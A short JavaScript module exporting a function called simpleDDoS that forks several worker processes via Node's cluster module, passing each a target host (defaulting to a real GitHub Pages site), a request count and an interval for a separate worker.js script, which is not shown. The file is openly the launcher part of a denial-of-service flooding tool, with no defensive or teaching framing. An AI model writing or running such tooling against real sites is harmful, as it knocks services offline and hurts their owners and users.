import cluster from 'cluster'
import { red, cyan, blue } from 'colorette'

export const simpleDDoS = (threads = 5, host = 'https://t0m0t0w.github.io', amount = 500, interval = 500) => {
  // Spawn main process
  cluster.setupMaster({
    exec: `${process.cwd()}/worker.js`,
    args: [host, amount, interval]
  })

  // Count threads
  let threadsCount = 0

  for (let i = 0; i < threads; i++) {
    cluster.fork()

    threadsCount++
  }

  cluster.on(
    'exit',
    (worker, code, signal) =>
      void code !== 0 &&
      console.log(
        red(`
Worker ${worker.process.pid} died. Before the death he said ${signal}.`)
      )
  )
}